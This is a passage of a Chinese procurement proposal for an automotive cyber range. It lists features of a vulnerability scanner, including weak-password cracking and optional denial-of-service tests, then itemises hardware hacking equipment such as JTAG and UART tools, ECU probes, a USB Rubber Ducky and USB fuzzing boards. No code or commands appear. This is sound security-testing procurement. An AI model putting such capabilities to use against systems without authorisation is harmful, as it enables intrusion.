、Chrome</li><li>支持针对IPv4环境的漏洞扫描</li><li>支持针对IPv6环境的漏洞扫描</li><li>支持修改账号密码</li><li>支持自定义创建账号，缺省系统管理员、配置管理员、审计管理员、报表管理员四种用户。</li><li>提供用户信息查看，可以查看用户名、用户权限模板、最近登录日期（包括具体时间）、账号状态、是否被锁定、登录超时时间（分钟）</li><li>支持新增用户、新增用户设置的信息包括：用户名、用户权限模板、登录锁定次数、登陆超时时间、是否需要定期更换密码、最小密码长度、密码强度要求、扫描白名单、扫描黑名单</li><li>支持自定义用户权限模板，缺省报表管理员功能组、审计管理员功能组、普通管理员功能组三种权限模板。</li><li>支持查看用户权限模板的详情信息包含已选功能组和已选功能菜单</li><li>支持检测结束发送报告至指定邮箱</li><li>支持检测结束发送SNMP Trap告警</li><li>支持检测结束发送SYSLOG告警</li><li>支持检测结束发送报告至指定FTP服务器</li><li>支持对系统CPU、内存、磁盘、网络状态、设备授权到期、特征库授权到期设置告警及告警值</li><li>支持查看系统告警日志的基本信息，备份、根据时间段搜索和告警类型搜索日志</li><li>支持将当前设备设置为分布式引擎、支持新增引擎地址、查看分布式引擎的基本信息</li><li>支持PING、WGET、端口探测等基本诊断工具，能够准确的诊断网络是否畅通</li><li>支持通过端口探测工具快速探测端口开放状态</li><li>支持遍历到数据包传输路径上的所有路由器</li><li>支持通过Tcpdump进行抓包</li><li>支持收集扫描、授权、引擎等的日志，方便排查</li><li>支持针对引擎、服务的常见问题，提供一键诊断和修复功能</li><li>支持界面配置反向支持端口，用户只需配置端口，降低售后支持难度</li><li>支持开启和关闭SSH服务</li><li>支持解锁SSH，方便使用SSH远程</li><li>支持新增、删除系统登陆信息，可手动输入或批量导入。支持登录信息的批量验证</li><li>支持通过messager服务，选择提醒被扫目标</li><li>支持选择最大限度报告漏洞，若开启，不考虑误报，报告所有可能存在的漏洞；关闭后，准确率大大提高，但可能会有漏报</li><li>支持选择执行所有规则检测，若开启，不考虑开启的服务，挨个使用插件检测，耗时长，可能检测到更多漏洞</li><li>支持选择是否执行危险测试，默认关闭。若开启，则将进行一些危险的测试方式，如：拒绝服务检测，将导致目标的拒绝服务。</li><li>支持选择是否启用口令破解，关闭后不执行弱口令相关检测插件</li><li>支持选择是否测试Oracle账号，关闭后不执行Oracle口令破解</li><li>支持设置插件超时时间</li><li>支持设置单个主机检测并发数</li><li>支持设置单个扫描任务并发主机数</li><li>支持设置单个主机TCP连接数</li><li>支持和微软WSUS补丁系统联动，方便进行自动化的补丁修补</li><li>支持Cookie/Session认证、Form认证、Basic认证、NTLM认证、Digest认证和SSL证书认证登录</li><li>支持设置起始URL、其它URL、网站域名、扫描根目录例外url等设置</li><li>支持设置并发线程数</li><li>支持区分url中的字母大小写</li><li>支持设置引擎保留的相似链接的数量最大值</li><li>支持设置引擎在归并链接时，同一目录下需要保留的链接数量</li><li>支持设置在链接无法访问时，重试的次数</li><li>支持设置访问链接时超过多长时间，判定链接无法访问</li><li>支持设置单个网站扫描的超时时间，默认为0无限制</li><li>支持选择代理类型，可选择http和socks，网站访问目标网站时，可能需要通过代理才能访问</li><li>支持选择是否开启暗链检测，发现网站中的存在的其他隐藏链接</li><li>支持选择是否开启网站木马检测，开启则检测网站中是否存在恶意脚本</li><li>支持设置检测深度。检测网站时爬虫爬取网站的页面深度</li><li>支持选择爬虫策略，广度优先还是深度优先</li><li>支持设置HTTP请求头，引擎爬虫模拟浏览器的UserAgent</li><li>支持设置引擎爬虫模拟提交时需要填充的表单的内容</li><li>支持设置爬取的最大页面数，超过最大页面数后，不做爬取</li><li>支持设置爬取页面的最大KB数，如果页面大小超过一定大小，则放弃爬取</li><li>支持设置额外URL，引擎爬虫不爬取的url关键字，一般为登出页面、危险操作、或不想做检测的链接</li><li>支持设置额外文件类型，引擎爬虫不对如下类型的链接爬取，一般为非文本的链接</li><li>支持设置额外特定参数，引擎对默认的参数不做安全检测</li><li>支持选择口令猜解。默认需要选择猜解服务类型，支持多选</li><li>支持常见服务如TELNET、FTP、SSH、POP3、SMB、SNMP、RDP、SMTP弱口令检测</li><li>支持常见数据库如Oracle、MySQL、PostgreSQL、MsSQL、REDIS、DB2、MongoDB、Sybase、Informix的弱口令检测</li><li>支持常见中间件如Tomcat、WebLogic、Jboss、WebSphere、GlassFish的弱口令检测</li><li>支持常见HTTP服务类型如http-get、http-get-form、http-post-form、http-head、http-post的弱口令检测</li><li>支持常见HTTPS服务类型如https-get、https-get-form、https-post-form、https-head、https-post的弱口令检测</li><li>支持常见摄像头类型如大华、华为、宇视、海康的弱口令检测</li><li>支持字典的标准模式和组合模式使用。标准模式为分开选择要使用的用户名字典和密码字典，组合模式则使用用户名密码组合字典</li><li>支持设置最大线程并发数，可设置单个服务口令猜解的并发线程数，值越大，探测速度越快</li><li>支持在线下发任务和离线下发任务</li><li>支持手动添加、使用资产、批量添加三种方式创建安全基线检测任务</li><li>支持对Windows、Linux等操作系统通过登录方式检测其漏洞安全基线，能够更加深入的进行安全基线检测</li><li>支持移动、电信、公安部、工信部安全配置规范</li><li>支持批量录入登录信息，批量验证</li><li>支持主流数据库漏洞的检测，包括：Oralce、MySQL、Postgres、IBM DB2、MongoDB、SQLServer、Informix、Sybase等</li><li>支持数据库登录扫描，至少应包括目标地址、端口、数据库账号、密码、SID、数据库名称、等登录选项的设置；</li><li>支持设置插件超时时间，超出时间则不进行检测</li><li>支持设置单个主机检测并发数，针对单个的检测目标，并发的检测插件</li><li>支持设置单个扫描任务并发主机数，单个扫描任务，可同时扫描的主机数量</li><li>支持设置单个主机TCP连接数，针对单个检测目标，并发的TCP连接数量</li><li>支持新增系统扫描、Web扫描、数据库扫描、弱口令、安全基线检测扫描任务，支持独立弱口令扫描任务下发</li><li>支持删除现有任务列表下的任意任务</li><li>支持编辑任务的执行方式、策略、告警等选项</li><li>支持针对已经新建的任务做任务复制，快速生成一个相同任务，支持对复制出来的任务进行再编辑，包括：任务名称、扫描目标；</li><li>支持查看一个任务中包含哪几种类型的子任务，以及任务进行状态，区分新增、已修复、误报等状态</li><li>支持系统扫描任务，查看任务的执行状态、进度、剩余时间；查看任务的扫描漏洞风险分布、主机信息、漏洞列表、漏洞所属分类、漏洞个数、端口服务列表、历史执行记录等信息</li><li>支持Web扫描任务，查看任务的执行状态、进度、剩余时间；查看任务的扫描漏洞风险分布、网站信息、漏洞列表、漏洞所属分类、漏洞个数、漏洞目录树结构、历史执行记录等信息，支持扫描过程及结果文件下载取证，含扫描结果、网站页面信息、请求和相应信息、扫描日志等</li><li>支持数据库扫描任务，查看任务的执行状态、进度、剩余时间；查看任务的扫描漏洞风险分布、所在主机信息、漏洞列表、漏洞所属分类、漏洞个数、端口服务列表、历史执行记录等信息</li><li>支持安全基线检测任务，查看主机的配置合规信息和详情</li><li>支持弱口令扫描任务，查看任务的执行状态、进度、剩余时间；查看主机的弱口令结果信息</li><li>支持查看所有当前正在执行的任务</li><li>支持通过任务的时间、状态和关键词检索进行查找任务</li><li>支持导出已完成的任务的报表</li><li>支持在在线查看已完成的任务的报表</li><li>支持以树形结构显示资产，可以通过勾选对指定资产进行操作。并显示资产总数和各类型资产的数量</li><li>支持单独和批量增加资产两种方式，批量增加资产需要上传包含指定格式信息的Excel</li><li>支持资产自动发现功能，支持利用历史扫描过程中发现的主机创建扫描任务</li><li>支持单独和批量删除资产</li><li>支持增加资产标签</li><li>支持查看资产的IP地址、资产类型、所属资产组、所属用户、标签和扫描出的风险详情</li><li>支持通过字段、操作系统类型、评分、mac地址、所属资产组、标签等查找资产</li><li>支持导出Execl格式的自查信息列表，需要勾选所要导出信息的资产</li><li>支持自定义资产组，缺省默认资产组</li><li>支持资产组的检索、编辑和删除</li><li>支持新增资产组，设定的内容包括资产组名称、资产组范围和备注</li><li>支持180000条以上系统漏洞库，并按照漏洞类别及漏洞威胁程度进行分类；支持插件库搜索可标示搜索范围提示</li><li>支持漏洞库涵盖标准包含CVE、CVSS、CNVD、CNNVD、CNCVE、Bugtraq编号6种</li><li>操作系统，支持对Windows系列、Linux、AIX、HPUX、IRIX、BSD、Solaris等目标主机的系统进行扫描</li><li>网络设备，支持Cisco、Juniper、华为、F5、Checkpoint在内的交换机、路由器等网络设备的漏洞扫描</li><li>安全设备，支持Checkpoint、赛门铁克、Cisco、Juniper、Palo Alto、华为在内的主流厂商的防火墙等安全设备漏洞扫描</li><li>移动设备，支持Android、IOS、BlackBerry、Windows Phone在内的移动设备漏洞扫描</li><li>虚拟化，支持检测VMware、KVM、XEN在内的虚拟化漏洞扫描</li><li>国产化，支持麒麟、凝思、XXXX、深度、欧拉等国产操作系统的漏洞扫描</li><li>数据库，支持常见数据库的漏洞扫描，支持国产化数据库如人大金仓、南大通用、达梦等的漏洞扫描</li><li>支持自定义系统扫描模板，可设置自定义模板的名字、查询条件和使用的漏洞插件。可以删除自定义的插件模板</li><li>支持Web漏洞扫描检测基于OWASP Top10标准进行规则定义</li><li>支持自定义系统扫描模板，可设置自定义模板的名字、查询条件和使用的漏洞插件。可以删除自定义的插件模板</li><li>系统根据漏洞风险等级制定了四种默认模板，高风险、高/中低风险、高/中/低风险和全部漏洞四个。</li><li>支持通过名称检索字典</li><li>支持默认包含用户名字典检测、密码字典检测、组合字典检测多种方式</li><li>支持用户自定义用户名密码列表导入检测</li><li>支持自定义基线策略，需要设定策略名称、查询条件</li><li>支持缺省内置标准基线核查模板，包括：等保三级检测要求、工信部配置规范、中国电信安全配置规范、中国移动安全配置规范；</li><li>支持资产属性、资产组、漏洞等级、漏洞名称、漏洞类别、漏洞评分、端口进行资产风险情况筛选查询并将查询结果导出</li><li>支持查看资产历史漏洞变化趋势，任务，新增、减少漏洞情况，最近一次检测时间；支持不同资产组资产总数和漏洞情况的对比统计</li><li>支持5中常见的报表格式，包括：Excel、Word、HTML、PDF、XML</li><li>支持自定义报表的公司信息</li><li>支持自定义导出检测详情</li><li>可根据漏洞状态（新增、误报、已修复）筛选导出报表</li><li>历史导出报表的总览、查询及管理</li><li>可自定义报表导出的漏洞等级、漏洞状态、公司信息及章节</li><li>支持软件license和数据库三年之内免费升级</li></ol><h1 id="智能汽车网络靶场工具库-硬件工具"><a href="#智能汽车网络靶场工具库-硬件工具" class="headerlink" title="智能汽车网络靶场工具库-硬件工具"></a>智能汽车网络靶场工具库-硬件工具</h1><h2 id="总体概述-5"><a href="#总体概述-5" class="headerlink" title="总体概述"></a>总体概述</h2><p>智能汽车网络靶场工具库-硬件工具可覆盖零部件、台架、整车相关的硬件安全测试，这些测试覆盖车载电子电器零部件。</p><p>智能汽车网络靶场硬件工具包括硬件安全测试工具集和车载以太网转换工具等。</p><h2 id="硬件安全测试工具集"><a href="#硬件安全测试工具集" class="headerlink" title="硬件安全测试工具集"></a>硬件安全测试工具集</h2><h3 id="工具概述-26"><a href="#工具概述-26" class="headerlink" title="工具概述"></a>工具概述</h3><p>对零部件硬件安全合规检测，如JTAG、USB、UART、SPI等接口，可针对固件提取、固件调试、硬件拆焊、线路焊接、PCB板电路检查、芯片秘钥、功耗泄露、ECU性能等测试提供必要的基础操作工具及耗材。</p><h3 id="工具方案-26"><a href="#工具方案-26" class="headerlink" title="工具方案"></a>工具方案</h3><ol><li>焊烟净化器，数量2台：额定电压220V50Hz，功率80w，系统流量200m³/h，滤芯层数3层，提供3套替换芯。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d313fbcc4bfe7051be47106ae56d0708.png"></p><ol><li>ECU探针，数量4套：适用于KESS V2, KTAG, KTM100, BDM100, 22pcs BDM 适配器。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/043286ad3f7c46ec9a0955c222e38119.png"></p><ol><li>Jtagulator，数量5套：支持的目标接口：JTAG/IEEE 1149.1，ARM SWD，UART/异步串行；可以直接连接 SigRok 和 OpenODC 使用；带输入保护电路的24个 I/O 通道；电平转换的可调目标电压：1.2V ~ 3.3V；USB 接口，用于连接电脑进行控制；尺寸：57.2mm x 152.5mm x 16mm。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/45c944a1e5950e550f81c7196399e1b0.png"></p><ol><li>EMMC植锡工具，数量3套：最大支持90mm*90mm BGA。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/09edd6dd19ef3911bb9f9264da8c5a7d.png"></p><ol><li>杜邦线，数量50套：母对母 线长30cm。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f62a9795e400e492705ce2359905e13e.png"></p><ol><li>剥线钳，数量5套：剥线直径1.25mm~8mm 可调式。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/38c7e760fcf2b6ac39379ffc7de6fa9a.png"></p><ol><li>UART工具，数量10套：USB转1.8/2.8/3.3/5V TTL。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9a4d3e2041cd352919d5efe9af404b7f.png"></p><ol><li>EMMC底座，数量5套：支持BGA152/BGA169封装。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f532f580307bbc4efc02807ab30712c9.png"></p><ol><li>螺丝刀，数量5套：螺丝刀套装 57合1。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d790c4728217a564ac97630c7571e599.png"></p><ol><li>电动螺丝刀，数量2个，12V供电，空转1-1500/分钟，扭矩30/13NM，木材钻孔20MM，金属钻孔10MM，电源方式为直流电。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/38528ff2c9920e2440493f9e2dfdd87e.png"></p><ol><li>DB9接头，数量40套：DB9针串口公头/母头。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/457735e8bf52edc9ea474c35609b2a8e.png"></p><ol><li>OBD线：数量5套。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/8700afea9965bf7389cb6037a39bac97.png"></p><ol><li>直流稳压电源，数量10套：三路可编程控直流电源30V/3A*2+5V/3A，艾德克斯IT6302；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/39819abe263e93d8a5fc46288eb00638.png"></p><ol><li>分控插排，数量20套：8个插座孔位，线长3米，品牌公牛。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/46ae309182b5821f89c55e2d89437f1a.png"></p><ol><li>分控插排，数量20套：8个插座孔位，线长5米，品牌公牛。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/315609880812fd646fa4ce57f578cc46.png"></p><ol><li>焊锡膏，数量10套：227℃高温无铅锡膏100g/罐。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3463f8de39207b263d9c445aaac8aa84.png"></p><ol><li>焊锡丝，数量20套：63%焊锡量，线径0.6mm 500克。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/681490b78c74166e79743b7601810e57.png"></p><ol><li>电子环保清洁剂，数量10套：电路板环保清洁剂 550ml装。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/027cdefcf5256ba56e2a53d6c0f92260.png"></p><ol><li>吸锡线，数量20套：宽1.5mm 长1.5米。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/2baba404338ac9f1824725b2bccec53d.png"></p><ol><li>烙铁头，数量10套：包含一字头/尖头/扁头。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f76ae7a575f6c682390d0a61fc982693.png"></p><ol><li>无尘布，数量10套：超细9*9无尘布 100片装。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b383032bf8d0df8fe8589ea2cde4abeb.png"></p><ol><li>芯片通用测试钩（烧录夹），数量10个。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d0265dc3fe376391f692d79faed60c1b.png"></p><ol><li>电工绝缘胶带，数量10卷。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/51815f8fa5cd219ea6bd7e25dd90e063.png"></p><ol><li>双工头USB，数量20套：公对公 2米 USB3.0。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/514643e6ac98747bf8acff8a67604df9.png"></p><ol><li>DC母头接线柱，数量20套：5.5*2.1MM/母头</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/fe07d29541295988506d3b7ce4fb6c13.png"></p><ol><li>DC12V/10A，数量20套：DC12V/10A DC5.5mm接口。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/194e3b5bfaf2ef2e705a99d54b3c82d9.png"></p><ol><li>Renesas调试器，数量5套。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/ee7cc364d1a7bc1a4ad6838740d98725.png"></p><p>·支持MCU片上调试仿真；</p><p>·支持瑞萨芯片烧写；</p><p>·支持热拔插功能；</p><p>·提供CAN时间测量功能；</p><p>·提供电流测量功能。</p><ol><li>多用途调试器，品牌：劳德巴赫，型号：μtrace32，数量1台</li></ol><p>劳特巴赫 μtrace32经济高效的全功能调试和追踪模块，充分利用专为需要Arm® Cortex®-M嵌入式设计定制的全功能调试和追踪系统的强大功能。µTrace®是我们经济高效的一体化解决方案，为实现最多4位紧凑追踪端口的Cortex-M微控制器提供全套功能。</p><p>µTrace®还可用于调试32位RISC-V内核。在RISC-V基金会采用追踪标准后，将立即添加对RISC-V的追踪支持</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a63918d21fcea0cae5d7793299bb41b5.png"></p><p>劳特巴赫 trace32</p><p><strong>I.系统组成：</strong>一个系统可根据需求选择基本控制单元模块和信号转换单 元模块及适配器组成。</p><p>DEBUG 单元模块（基本控制单元）；</p><p>针对不同处理器系列的信号转换单元模块，另有多类型适配器以实现接口转换；</p><p>TRACE 单元模块；</p><p>针对不同处理器系列的跟踪预处理模块；</p><p>代码逻辑分析模块和逻辑探头模块。</p><p>其中，基本控制单元通过信号转换单元连接到目标机电路板上的调试信号接口，对目标系统进行调试。TRACE 单元模块和跟踪预处理模块是可选的扩展模块，以实现基于跟踪(trace)信息的丰富调试、分析功能。代码逻辑分析模块是可扩展的能耗分析模块，将目标硬件能耗和软件代码行对应，更深入地实现嵌入式开发的性能优化。</p><p><strong>II.模块化设计：</strong>为了能够有效地保护客户地长期投资，TRACE32® ICD 调试器采用了先进的模块化设计设想。不同的产品搭配或者扩展升级，可以使客户能够支持更多的处理器应用开发。</p><p><strong>III.技术参数：</strong></p><p>·支持 JTAG/ ETM/ PTM 等调试接口；<br>·支持 ASM、HLL (C、C++、JAVA) 、脚本语言；<br>·通过 USB2.0, USB3.0 和1Gbit 以太网接口连接到主机；<br>·上位机（PC 或者 Workstation）操作系统支持 Windows/ Linux/ MacOSX 等；<br>·下载速度不小于 4Mbit/s，支持智能下载模式；<br>·支持包括 ARMCC, GCC、G++、GNU/GCC、GREENHILLS-C 等与处理器相关的多种编译器；<br>·支持包括 Linux,WIN CE, VxWorks, ThreadX 等操作系统调试；<br>·支持常用的ARMV8,V7,Cortex.RH850,Tricore2xx,3xx.MPC5xx处理器架构；<br>·支持软件、片上、条件等丰富的断点类型；<br>·支持 NOR/ NAND 等Flash 烧写；<br>·支持指令集仿真功能；<br>·支持堆栈调用恢复功能；<br>·支持内存泄露分析；<br>·支持多核/多CPU 系统调试；<br>·支持 SMP/AMP 架构调试；<br>·MMU/虚拟地址空间；<br>·支持 ARM 的Trustzone 模式；<br>·支持智能脚本；<br>·支持历史程序场景重现；<br>·支持性能分析、代码覆盖率分析；<br>·支持程序流、数据流的记录；<br>·支持 Long-term 实时跟踪；<br>·跟踪内存大小大于 1Gbyte，跟踪速率大于 500Mhz/s；<br>·支持最高跟踪接口带宽大于 20Gbit/s；<br>·支持高速信号抽样速率 500Mhz/s 的抽样时间；<br>·支持大于 64 通道数字/模拟信号的抽样通道；<br>·支持协议分析功能；<br>·支持能耗分析功能；<br>·支持软/硬件综合验证测试。</p><ol><li>infineon芯片调试器，数量5套：支持infineon芯片烧写。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0bfe4e6f19a84caa0110238089ca6b74.png"></p><ol><li>JLINK调试器转接板，数量10套。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/59444553a1b1455c55d6bb03cbeb2cc7.png"></p><ol><li>零部件整理箱20个，尺寸80L。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/269a4f4e2a8d02b6c86937abfa530cf7.png"></p><ol><li>HDMI转DP转接头，数量40个。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/b404cfc649e7532bfce17cc946dcf9e6.png"></p><ol><li>网线，数量20个，长度1米。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/8e51f6454c04e4129dd95da0c0e6cb29.png"></p><ol><li>HDMI转VGA转接头,数量5个。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/30d2f2ccbb9ed50a0d5d969e4b103f32.png"></p><ol><li>HDMI转Type-C转接头，数量5个。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a23d721ebdb2e0ac897467a0583e70d6.png"></p><ol><li>HDMI转lightning转接头，数量5个。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0efde48d4c53c3e3731f28bed685bda3.png"></p><ol><li>HDMI线，数量20个，长度3米。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9ea3207ea03e28ba545c2c9a5b75ad3d.png"></p><ol><li>无线网卡，数量5个，支持监听模式，可抓取空中WiFi数据包。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e41779b7b3122065163bf2579c801fc3.png"></p><ol><li>汽车电瓶充电器，数量1套，支持电流调节，支持不同电瓶充电，支持LCD数显可视化操作，支持智能芯片，提供充电夹。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/36b1933e532c69974d20338a6dd57c18.png"></p><ol><li>车载应急启动电源，数量1套，支持容量16500毫安，支持电流600A，支持LED数显屏，提供电瓶线夹，支持双USB输出。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/73810939ca832dcfbc59951ae06be69f.png"></p><h2 id="USB测试工具集"><a href="#USB测试工具集" class="headerlink" title="USB测试工具集"></a>USB测试工具集</h2><h3 id="工具概述-27"><a href="#工具概述-27" class="headerlink" title="工具概述"></a>工具概述</h3><p>USB测试工具集包含模糊测试工具、USB橡皮鸭、无线网卡等，通过可编程的软硬件对USB设备进行模拟，测试USB主、从协议栈的安全通信，同时针对USB端口进行的文件下载、程序植入等安全威胁进行验证测试。</p><h3 id="工具方案-27"><a href="#工具方案-27" class="headerlink" title="工具方案"></a>工具方案</h3><ol><li>提供2套模糊测试工具板作为远程控制USB控制器的硬件设备，搭配程序可提供USB主机和从机模式模拟，并允许发送预先形成带有漏洞的USB请求和响应。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9938c225c34f70e1dfbe73dfbaaad7a8.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/ada908b54098f3b82e43b9c1504a7322.png"></p><ol><li>提供USB Rubber Ducky ，数量2个：四核、8G NAND SSD、配置RGBLED。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f73f954caa303cc708277becdf0b2dd4.png"></p><ol><li>提供USB无线网卡，数量15个：支持2.4G+5G双频、支持Windows、linux。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/0a5469640260f6e809b278d9a00dae6f.png"></p><ol><li>提供USB分线器，数量10个：USB3.0接口、1拖4分线器、长度0.5米。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f5891dc09d6490ea9d663827c42f342e.png"></p><ol><li>提供调试工具，数量1个：可支持IMC100 系列:IMC101T-T038、IMC101T-Q048、IMC101T-F064、IMC102T-F064调试。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a24ab0572b5ca7846ea16a335afa533f.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/85b62888bdc9fb7b96bb244e05ec6592.png"></p><h2 id="车载以太网转换工具"><a href="#车载以太网转换工具" class="headerlink" title="车载以太网转换工具"></a>车载以太网转换工具</h2><h3 id="工具概述-28"><a href="#工具概述-28" class="headerlink" title="工具概述"></a>工具概述</h3><p>可在汽车以太网连接和任何具有带 RJ-45 连接器的标准以太网网络接口卡 (NIC) 的设备之间建立物理层转换</p><p>数量：100BASE-T1转Tx 20套，1000BASE-T1转Tx 20套</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/20e7b25151a6a5db2bde6fc92f67c14f.png"></p><p>百兆车载以太网转换工具</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/77ed855e5f1429956e2c95fc5237e6ed.png"></p><p>千兆车载以太网转换工具</p><h3 id="工具方案及参数"><a href="#工具方案及参数" class="headerlink" title="工具方案及参数"></a>工具方案及参数</h3><p>功能参数如下：</p><p>设备宽压供电:支持DC6V-28V电源输入，带反接保护，带浪涌保护；</p><p>设备工作电流不等于50mA@12V；</p><p>设备支持1个标准RJ45以太网接口；</p><p>设备具有车载以太网状态指示灯，可指示连接状态及通讯状态；</p><p>设备具备的标准以太网接口:RJ45带指示灯；</p><p>设备支持Master/Slave切换功能，可以适应不同的设备；</p><p>设备支持车载以太网支持标准100BASE-T1协议。</p><p>性能参数如下：</p><p>设备传输距离:实测车载线15m，100M线速，传输稳定无丢包。</p><h2 id="设备清单"><a href="#设备清单" class="headerlink" title="设备清单"></a>设备清单</h2><p>我司为本项目提供硬件工具清单如下：</p><p>硬件工具设备清单</p><table><thead><tr><th>序号</th><th>类型</th><th>名称</th><th>类型</th><th>数量</th></tr></thead><tbody><tr><td></td><td>硬件拆焊工具</td><td>焊烟净化器</td><td>硬件</td><td>2台</td></tr><tr><td></td><td></td><td>EMMC植锡工具</td><td>硬件</td><td>3套</td></tr><tr><td></td><td></td><td>热缩管</td><td>硬件</td><td>500个</td></tr><tr><td></td><td></td><td>热熔胶枪</td><td>硬件</td><td>5个</td></tr><tr><td></td><td></td><td>焊锡膏</td><td>硬件</td><td>10个</td></tr><tr><td></td><td></td><td>焊锡丝</td><td>硬件</td><td>20卷</td></tr><tr><td></td><td></td><td>电子环保清洁剂</td><td>硬件</td><td>10瓶</td></tr><tr><td></td><td></td><td>吸锡线</td><td>硬件</td><td>20套</td></tr><tr><td></td><td></td><td>烙铁头</td><td>硬件</td><td>10个</td></tr><tr><td></td><td></td><td>无尘布</td><td>硬件</td><td>10个</td></tr><tr><td></td><td>硬件弱电工具</td><td>电工绝缘胶带</td><td>硬件</td><td>10卷</td></tr><tr><td></td><td></td><td>DC母头接线柱</td><td>硬件</td><td>20个</td></tr><tr><td></td><td></td><td>螺丝刀</td><td>硬件</td><td>5套</td></tr><tr><td></td><td></td><td>电动螺丝刀</td><td>硬件</td><td>2套</td></tr><tr><td></td><td></td><td>终端电阻</td><td>硬件</td><td>50个</td></tr><tr><td></td><td></td><td>网线钳</td><td>硬件</td><td>5个</td></tr><tr><td></td><td></td><td>杜邦线</td><td>硬件</td><td>50套</td></tr><tr><td></td><td></td><td>剥线钳</td><td>硬件</td><td>5套</td></tr><tr><td></td><td>硬件连接转换工具</td><td>HDMI转DP转接头</td><td>硬件</td><td>40个</td></tr><tr><td></td><td></td><td>1米网线</td><td>硬件</td><td>20个</td></tr><tr><td></td><td></td><td>HDMI转Type-C转接头</td><td>硬件</td><td>5个</td></tr><tr><td></td><td></td><td>HDMI转lightning转接头</td><td>硬件</td><td>5个</td></tr><tr><td></td><td></td><td>HDMI转VGA转接头</td><td>硬件</td><td>5个</td></tr><tr><td></td><td></td><td>3米HDMI线</td><td>硬件</td><td>20个</td></tr><tr><td></td><td></td><td>无线网卡</td><td>硬件</td><td>5个</td></tr><tr><td></td><td></td><td>Micro 